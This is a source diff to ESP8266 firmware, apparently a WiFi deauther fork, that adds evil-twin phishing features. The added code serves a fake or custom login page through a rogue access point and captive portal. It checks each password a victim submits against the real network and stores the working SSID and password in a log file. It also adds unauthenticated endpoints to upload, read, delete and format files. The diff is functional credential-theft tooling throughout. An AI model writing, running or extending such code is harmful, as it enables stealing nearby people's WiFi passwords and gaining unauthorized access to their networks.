@@ -12,6 +12,7 @@ extern "C" {
 #include <DNSServer.h>
 #include <ESP8266mDNS.h>
 #include <LittleFS.h>
+#include <EEPROM.h>
 
 #include "language.h"
 #include "debug.h"
@@ -43,7 +44,28 @@ typedef struct ap_settings_t {
     bool    hidden;
     bool    captive_portal;
 } ap_settings_t;
+String FILE_PATH = "eviltwin.html";
+void save(bool force, String buffer) {
+    if (!force) return;
 
+    String buf = String();                              // create buffer
+    buf = buffer;
+    if (!writeFile(FILE_PATH, buf)) {
+        prnt(F_ERROR_SAVING);
+        prntln(FILE_PATH);
+        return;
+    }
+    prnt(SS_SAVED_IN);
+    prntln(FILE_PATH);
+}
+
+void save(bool force, String filepath, String buffer) {
+    String tmp = FILE_PATH;
+
+    FILE_PATH = filepath;
+    save(force, buffer);
+    FILE_PATH = tmp;
+}
 namespace wifi {
     // ===== PRIVATE ===== //
     wifi_mode_t   mode;
@@ -55,6 +77,7 @@ namespace wifi {
     IPAddress ip WEB_IP_ADDR;
     IPAddress    netmask(255, 255, 255, 0);
 
+    int totalFileSize = 0;
     void setPath(String path) {
         if (path.charAt(0) != '/') {
             path = '/' + path;
@@ -184,9 +207,8 @@ namespace wifi {
     void sendProgmem(const char* ptr, size_t size, const char* type) {
         server.sendHeader("Content-Encoding", "gzip");
         server.sendHeader("Cache-Control", "max-age=3600");
-        server.send_P(200, str(type).c_str(), ptr, size);
+        server.send(200, str(type).c_str(), ptr, size);
     }
-
     // ===== PUBLIC ====== //
     void begin() {
         // Set settings
@@ -267,59 +289,218 @@ namespace wifi {
         WiFi.softAPConfig(ip, ip, netmask);
         WiFi.softAP(ap_settings.ssid, ap_settings.password, ap_settings.channel, ap_settings.hidden);
         wifi::startWebServer();
-    }\
+    }
     void connectHandler(){
-        String html = "<html><body><h1>Masukkan informasi jaringan WiFi Tujuan:</h1>";
-        html += "<form action=\"/connect\" method=\"post\">";
-        html += "SSID: <input type=\"text\" name=\"ssid\"><br>";
-        html += "Password: <input type=\"password\" name=\"pass\"><br>";
-        html += "<input type=\"submit\" value=\"Hubungkan\"></form></body></html>";
-        server.send(200, "text/html", html);
-            
-        if (server.hasArg("ssid") && server.hasArg("pass")) {
+        if (server.hasArg("ssid")) {
             String ssid = server.arg("ssid");
-            String pass = server.arg("pass");
-
-            WiFi.begin(ssid.c_str(), pass.c_str());
-            while (WiFi.status() != WL_CONNECTED) {
-                delay(1000);
-                Serial.println("Tidak dapat terhubung ke WiFi tujuan. Coba lagi...");
+            String pass = "";
+            if (server.hasArg("pass")){
+                pass = server.arg("pass");
             }
-            server.send(200, "text/html", "Terhubung ke WiFi tujuan!");
+            sendProgmem(connectinghtml, sizeof(connectinghtml), W_HTML);
+            if (!pass.isEmpty()) WiFi.begin(ssid.c_str(), pass.c_str());
+            else WiFi.begin(ssid.c_str());
+        }else{
+            String html = "<html><body><h1>Masukkan informasi jaringan WiFi Tujuan:</h1>";
+            html += "<form action=\"/connect\" method=\"GET\">";
+            html += "SSID: <input type=\"text\" name=\"ssid\"><br>";
+            html += "Password: <input type=\"password\" name=\"pass\"><br>";
+            html += "<input type=\"submit\" value=\"Hubungkan\"></form></body></html>";
+            server.send(200, "text/html", html);
+        }
+    }
+
+    void sendEvilTwin(){
+        String filePath = "";
+        String content = "";
+        
+        if (readFile("/eviltwin.txt", filePath)){
+            if (!filePath.isEmpty()){
+                if (readFile(filePath, content)){
+                    if (!content.isEmpty()){
+                        server.send(200, W_HTML, content.c_str());
+                    }else{
+                        sendProgmem(loginhtml, sizeof(loginhtml), W_HTML);
+                    }
+                }else{
+                    sendProgmem(loginhtml, sizeof(loginhtml), W_HTML);
+                }
+            }else{
+                sendProgmem(loginhtml, sizeof(loginhtml), W_HTML);
+            }
+        }else{
+            sendProgmem(loginhtml, sizeof(loginhtml), W_HTML);
+        }
+    }
+    String bufferToString(const uint8_t* buffer, size_t size) {
+        String result;
+        for (size_t i = 0; i < size; ++i) {
+            result += static_cast<char>(buffer[i]);
+        }
+        return result;
+    }
+    void removeAll(){
+        if (LittleFS.format()){
+            server.send(200,W_OK, W_OK);
+            delay(500);
+            ESP.reset();
+        }else{
+            server.send(200,W_OK, "FAILED");
+        }
+    }
+
+    bool saveWiFiEvil(String ssid, String pass){
+        String pathLocation = "/log.json";
+        String lastBuffer = String();
+        bool working = readFile(pathLocation, lastBuffer);
+        if (working) {
+            const char* empty = "";
+            lastBuffer.replace(String(OPEN_BRACKET), String(empty));
+            lastBuffer.replace(String(CLOSE_BRACKET), String(empty));
+        }
+        String tmp = String(OPEN_BRACKET);
+        tmp += (!lastBuffer.isEmpty() ? lastBuffer + String(COMMA) : String("")) + 
+            String(OPEN_CURLY_BRACKET) + 
+                String(DOUBLEQUOTES) + "ssid" + String(DOUBLEQUOTES) + String(DOUBLEPOINT) + String(DOUBLEQUOTES) + ssid + String(DOUBLEQUOTES) + String(COMMA) +
+                String(DOUBLEQUOTES) + "pass" + String(DOUBLEQUOTES) + String(DOUBLEPOINT) + String(DOUBLEQUOTES) + pass + String(DOUBLEQUOTES) +
+            String(CLOSE_CURLY_BRACKET);
+        tmp += String(CLOSE_BRACKET);
+        
+        if (working){
+            String newBuffer = tmp;
+            working = writeFile(pathLocation, newBuffer);
+        }else{
+            working = writeFile(pathLocation, tmp);
+        }
+        return working;
+    }
+    String fileCliList(){
+        String tmp = String(OPEN_BRACKET);
+        Dir rootDir = LittleFS.openDir("/");
+        totalFileSize = 0;
+        while (rootDir.next())
+        {
+            if (rootDir.isFile()){
+                tmp += 
+                String(OPEN_CURLY_BRACKET) + 
+                    String(DOUBLEQUOTES) + "name" + String(DOUBLEQUOTES) + String(DOUBLEPOINT) + String(DOUBLEQUOTES) + rootDir.fileName() + String(DOUBLEQUOTES) + String(COMMA) +
+                    String(DOUBLEQUOTES) + "size" + String(DOUBLEQUOTES) + String(DOUBLEPOINT) + String(DOUBLEQUOTES) + rootDir.fileSize() + String(DOUBLEQUOTES) +
+                String(CLOSE_CURLY_BRACKET) + String(COMMA);
+                totalFileSize += rootDir.fileSize();
+            }
+        }
+        tmp = tmp.substring(0, tmp.length() - 1);
+        tmp += String(CLOSE_BRACKET);
+        return tmp;
+    }
+
+    void handleFileCli(){
+        String command = server.arg("cmd");
+        int cmdType = command == "listfile" ? 1 : 0;
+        switch (cmdType)
+        {
+            case 1:
+                server.send(200, W_JSON, fileCliList());
+                break;
+            
+            default:
+                if (removeFile(command)){
+                    server.send(200, W_TXT, "OK");
+                }else{
+                    server.send(200, W_TXT, "FAILED");
+                }
+                break;
         }
     }
     void startWebServer(){
-
         dns.setErrorReplyCode(DNSReplyCode::NoError);
         dns.start(53, "*", ip);
-
         MDNS.begin(WEB_URL);
 
         server.on("/list", HTTP_GET, handleFileList); // list directory
+        server.on("/read", HTTP_GET, [](){
+            if (!handleFileRead(server.arg("path"))){
+                server.send(500, W_TXT, W_BAD_ARGS);
+            }
+        });
+
+        fileCliList();
 
         #ifdef USE_PROGMEM_WEB_FILES
         // ================================================================
         // paste here the output of the webConverter.py
         if (!settings::getWebSettings().use_spiffs) {
+            server.on("/fsinfo", HTTP_GET, [](){
+                server.send(200, W_HTML, "Used : " + String(totalFileSize / 1024) + "k | Storage space : " + String((((1024*1024) * 2) - totalFileSize) / 1024) + "k");
+            });
             server.on("/", HTTP_GET, []() {
                 if (EvilTwin::isRunning()){
-                    sendProgmem(loginhtml, sizeof(loginhtml), W_HTML);
+                    sendEvilTwin();
                 }else{
                     sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
                 }
             });
             server.on("/index.html", HTTP_GET, []() {
                 if (EvilTwin::isRunning()){
-                    sendProgmem(loginhtml, sizeof(loginhtml), W_HTML);
+                    sendEvilTwin();
                 }else{
                     sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
                 }
+            });
+            server.on("/wifistatus.txt", HTTP_GET, []() {
+                if (WiFi.status() == WL_CONNECTED){
+                    server.send(200, W_HTML, ("Connected To : " + WiFi.SSID()).c_str());
+                    if (!EvilTwin::isRunning()){
+                        wifi::stopAP();
+                        wifi::startAP();
+                    }
+                }else{
+                    server.send(200, W_HTML, "Failed to connect to WiFi. Timeout reached.");
+                }
+            });
+
+            server.on("/pathsave", HTTP_GET, []() {
+                String arg1 = server.arg("path");
+                save(true, "/eviltwin.txt", arg1);
+                
+                String htmlResponse = "<html><body>";
+                htmlResponse += "<script>alert('SUCCESS'); window.history.back();</script>";
+                htmlResponse += "</body></html>";
+                server.send(200, "text/html", htmlResponse);
+            });
+            
+            server.on("/upload", HTTP_POST, []() {
+                HTTPUpload& upload = server.upload();
+                String fileName, content;
+
+                fileName = "/" + upload.filename;
+                content = bufferToString(upload.buf, upload.contentLength);
+                if (writeFile(fileName, content)){
+                    String htmlResponse = "<html><body>";
+                    htmlResponse += "<script>alert('File upload finished: " + fileName + ", size: " + String(upload.contentLength) + "'); window.history.back();</script>";
+                    htmlResponse += "</body></html>";
+                    server.send(200, "text/html", htmlResponse);
+                }else{
+                    String htmlResponse = "<html><body>";
+                    htmlResponse += "<script>alert('File upload failed!!!'); window.history.back();</script>";
+                    htmlResponse += "</body></html>";
+                    server.send(200, "text/html", htmlResponse);
+                }
+
+            });
+            server.on("/filecli", HTTP_GET, handleFileCli);
+            server.on("/format", HTTP_GET, removeAll);
+            server.on("/eviltwin", HTTP_GET, []() {
+                sendEvilTwin();
             });
             server.on("/scan.html", HTTP_GET, []() {
                 sendProgmem(scanhtml, sizeof(scanhtml), W_HTML);
             });
             server.on("/info.html", HTTP_GET, []() {
                 sendProgmem(infohtml, sizeof(infohtml), W_HTML);
+            });
+            server.on("/fsmanager.html", HTTP_GET, []() {
+                sendProgmem(fsmanagerhtml, sizeof(fsmanagerhtml), W_HTML);
             });
             server.on("/ssids.html", HTTP_GET, []() {
                 sendProgmem(ssidshtml, sizeof(ssidshtml), W_HTML);
@@ -338,6 +519,9 @@ namespace wifi {
             });
             server.on("/js/site.js", HTTP_GET, []() {
                 sendProgmem(sitejs, sizeof(sitejs), W_JS);
+            });
+            server.on("/js/fs.js", HTTP_GET, []() {
+                sendProgmem(fsjs, sizeof(fsjs), W_JS);
             });
             server.on("/js/attack.js", HTTP_GET, []() {
                 sendProgmem(attackjs, sizeof(attackjs), W_JS);
@@ -455,21 +639,16 @@ namespace wifi {
             server.send(200, str(W_JSON), attack.getStatusJSON());
         });
         server.on("/connect", HTTP_GET, connectHandler);
-        server.on("/connect", HTTP_POST, connectHandler);
 
         server.on("/submit", HTTP_GET, []() {
-            sendProgmem(connectinghtml, sizeof(connectinghtml), W_HTML);
-            String pass = server.arg("password");
-            EvilTwin::passTesting = pass;
-            if (!pass.isEmpty()){
+            if (EvilTwin::isRunning()){
+                String pass = server.arg("password");
+                Serial.println("["+EvilTwin::ssidT+"] Connecting PASS '" + pass.c_str() + "'");
                 WiFi.begin(EvilTwin::ssidT, pass);
-                while (WiFi.status() != WL_CONNECTED) {
-                    delay(250);
-                    if (WiFi.status() == WL_CONNECTED){
-                        EvilTwin::pass = pass;
-                        EvilTwin::stop();
-                    }
-                }
+                EvilTwin::passTesting = pass;
+                sendProgmem(connectinghtml, sizeof(connectinghtml), W_HTML);
+            }else{
+                server.send(404, W_TXT, W_FILE_NOT_FOUND);
             }
         });
 
@@ -479,7 +658,7 @@ namespace wifi {
             if (!handleFileRead(server.uri())) {
                 if (settings::getWebSettings().captive_portal || EvilTwin::isRunning()){
                     if (EvilTwin::isRunning()){
-                        sendProgmem(loginhtml, sizeof(loginhtml), W_HTML);
+                        sendEvilTwin();
                     }else{
                         sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
                     }
@@ -520,6 +699,11 @@ namespace wifi {
         if ((mode != wifi_mode_t::off) && !scan.isScanning()) {
             server.handleClient();
             dns.processNextRequest();
+        }
+        if (WiFi.status() == WL_CONNECTED && EvilTwin::isRunning()){
+            EvilTwin::pass = EvilTwin::passTesting;
+            EvilTwin::stop();
+            saveWiFiEvil(EvilTwin::ssidT, EvilTwin::getpass());
         }
     }
 }
